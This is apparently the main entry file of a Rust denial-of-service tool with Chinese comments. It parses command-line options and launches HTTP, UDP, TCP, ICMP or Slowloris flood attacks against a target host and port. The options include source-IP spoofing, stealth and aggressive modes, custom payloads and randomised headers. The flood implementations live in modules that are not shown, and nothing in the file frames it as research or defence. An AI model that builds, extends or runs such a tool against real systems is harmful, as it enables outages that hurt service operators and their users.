mod attack;
mod stats;
mod udp_flood;
mod tcp_flood;
mod icmp_flood;
mod slowloris;
mod interactive;
mod config;

use clap::Parser;
use attack::{run_attack, AttackConfig};
use udp_flood::{run_udp_flood, UdpFloodConfig};
use tcp_flood::{run_tcp_flood, TcpFloodConfig};
use icmp_flood::{run_icmp_flood, IcmpFloodConfig};
use slowloris::{run_slowloris, SlowlorisConfig};
use interactive::start_interactive_mode;
use config::AppConfig;

#[derive(Parser, Debug)]
#[command(author, version, about, long_about = None)]
struct Args {
    /// 目标IP地址
    #[arg(short, long)]
    target: Option<String>,
    /// 目标端口
    #[arg(short, long, default_value_t = 80)]
    port: u16,
    /// 并发连接数
    #[arg(short, long)]
    connections: Option<usize>,
    /// 请求持续时间（秒）
    #[arg(short, long)]
    duration: Option<u64>,
    /// 是否使用HTTPS
    #[arg(long)]
    https: bool,
    /// HTTP方法 (GET/POST)
    #[arg(long, default_value = "GET")]
    method: String,
    /// POST请求的数据
    #[arg(long)]
    post_data: Option<String>,
    /// 自定义User-Agent
    #[arg(long)]
    user_agent: Option<String>,
    /// 攻击模式 (normal/stealth/aggressive)
    #[arg(short, long)]
    mode: Option<String>,
    /// 攻击类型 (http/udp/tcp/icmp/slowloris)
    #[arg(short, long, default_value = "http")]
    attack_type: String,
    /// 数据包大小
    #[arg(long)]
    packet_size: Option<usize>,
    /// TCP负载类型 (random/http/custom)
    #[arg(long, default_value = "random")]
    payload_type: String,
    /// 自定义TCP负载
    #[arg(long)]
    custom_payload: Option<String>,
    /// 伪装源IP (ICMP)
    #[arg(long)]
    spoof_source: bool,
    /// 随机数据包大小 (ICMP)
    #[arg(long)]
    random_packet_size: bool,
    /// 最小数据包大小 (ICMP)
    #[arg(long, default_value_t = 64)]
    min_packet_size: usize,
    /// 最大数据包大小 (ICMP)
    #[arg(long, default_value_t = 1024)]
    max_packet_size: usize,
    /// 超时时间 (Slowloris)
    #[arg(long, default_value_t = 30)]
    timeout: u64,
    /// 保持连接 (Slowloris)
    #[arg(long)]
    keep_alive: bool,
    /// 随机头部 (Slowloris)
    #[arg(long)]
    random_headers: bool,
    /// 最小间隔 (Slowloris)
    #[arg(long, default_value_t = 10)]
    min_interval: u64,
    /// 最大间隔 (Slowloris)
    #[arg(long, default_value_t = 50)]
    max_interval: u64,
    /// 交互模式
    #[arg(short, long)]
    interactive: bool,
}

#[tokio::main]
async fn main() {
    let args = Args::parse();
    
    // 加载配置文件
    let config = AppConfig::load();
    println!("📋 已加载配置文件");

    // 交互模式
    if args.interactive {
        start_interactive_mode().await;
        return;
    }

    // 命令行模式
    if let Some(target) = args.target {
        // 使用命令行参数或配置文件默认值
        let connections = args.connections.unwrap_or_else(|| {
            match args.attack_type.to_lowercase().as_str() {
                "http" | "https" => config.default_http_connections,
                "udp" => config.default_udp_connections,
                "tcp" => config.default_tcp_connections,
                "icmp" => config.default_icmp_connections,
                "slowloris" => config.default_slowloris_connections,
                _ => config.default_http_connections,
            }
        });
        
        let duration = args.duration.unwrap_or(config.default_duration);
        let mode = args.mode.unwrap_or(config.default_mode);
        let packet_size = args.packet_size.unwrap_or(config.default_packet_size);

        match args.attack_type.to_lowercase().as_str() {
            "http" | "https" => {
                let config = AttackConfig {
                    target: target.clone(),
                    port: args.port,
                    connections,
                    duration,
                    https: args.https,
                    method: args.method.to_uppercase(),
                    post_data: args.post_data,
                    user_agent: args.user_agent,
                    mode,
                };
                run_attack(config).await;
            }
            "udp" => {
                let config = UdpFloodConfig {
                    target: target.clone(),
                    port: args.port,
                    connections,
                    duration,
                    packet_size,
                    mode,
                };
                run_udp_flood(config).await;
            }
            "tcp" => {
                let config = TcpFloodConfig {
                    target: target.clone(),
                    port: args.port,
                    connections,
                    duration,
                    packet_size,
                    mode,
                    payload_type: args.payload_type,
                    custom_payload: args.custom_payload,
                };
                run_tcp_flood(config).await;
            }
            "icmp" => {
                let config = IcmpFloodConfig {
                    target: target.clone(),
                    connections,
                    duration,
                    packet_size,
                    mode,
                    spoof_source: args.spoof_source,
                    random_packet_size: args.random_packet_size,
                    min_packet_size: args.min_packet_size,
                    max_packet_size: args.max_packet_size,
                };
                run_icmp_flood(config).await;
            }
            "slowloris" => {
                let config = SlowlorisConfig {
                    target,
                    port: args.port,
                    connections,
                    duration,
                    mode,
                    timeout: args.timeout,
                    keep_alive: args.keep_alive,
                    random_headers: args.random_headers,
                    min_interval: args.min_interval,
                    max_interval: args.max_interval,
                };
                run_slowloris(config).await;
            }
            _ => {
                eprintln!("❌ 不支持的攻击类型: {}", args.attack_type);
                eprintln!("支持的类型: http, udp, tcp, icmp, slowloris");
            }
        }
    } else {
        eprintln!("❌ 请指定目标IP/域名或使用 --interactive 进入交互模式");
        eprintln!("示例: {} --target 127.0.0.1 --port 8080", std::env::args().next().unwrap());
        eprintln!("或使用: {} --interactive", std::env::args().next().unwrap());
    }
}
